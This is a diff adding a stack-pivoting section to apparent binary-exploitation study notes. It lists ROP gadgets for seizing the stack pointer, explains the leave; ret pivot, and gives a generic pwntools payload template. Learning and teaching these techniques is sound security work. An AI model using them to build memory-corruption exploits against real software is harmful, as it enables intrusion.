@@ -133,3 +133,33 @@ bss_section = elf.symbols.__bss_start
 
 ## Stack Pivoting
 
+Gadgets to control ESP/RSP:  
+
+```asm
+pop rsp; ret;               # Unlikely, but great
+
+xchg <reg>, rsp; ret;       # Just need to control the register in question:
+# eg.
+pop <reg>; ret;
+<reg value>
+xchg <reg>, rsp; ret
+
+leave; ret;                 # These are everywhere
+```
+
+leave; ret; explanation:  
+`leave` is equivalent to `mov rsp, rbp; pop rbp;`  
+So a `leave; ret;` looks like `mov rsp, rbp; pop rbp; pop rip;`  
+That means that when we overwrite RIP, the 8 bytes before it overwrite RBP (4 bytes for ESP)  
+If we then call `leave; ret;` again, RBP is moved into RSP, thus giving us control over the stack location.  
+
+### Example "leave; ret;" Payload
+
+```python3
+from pwn import *
+rop.raw([
+    b"A" * rbp_offset, # eip control - 8 (4 for 32bit)
+    new_stack_addr,
+    leave_ret,
+])
+```
